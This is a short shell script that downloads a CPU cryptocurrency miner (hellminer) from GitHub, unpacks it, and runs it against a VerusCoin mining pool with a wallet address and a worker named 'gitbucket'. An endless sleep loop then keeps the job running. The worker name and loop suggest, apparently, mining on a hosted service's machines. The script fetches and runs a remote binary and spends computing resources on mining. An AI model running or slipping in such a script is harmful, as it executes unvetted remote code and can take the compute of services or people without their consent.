#veruscoin
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLiebdNReQXoFdMcGETM94omsr98TPrZCj.gitbucket -p x --cpu 2
while [ 1 ]; do
sleep 3
done
sleep 999
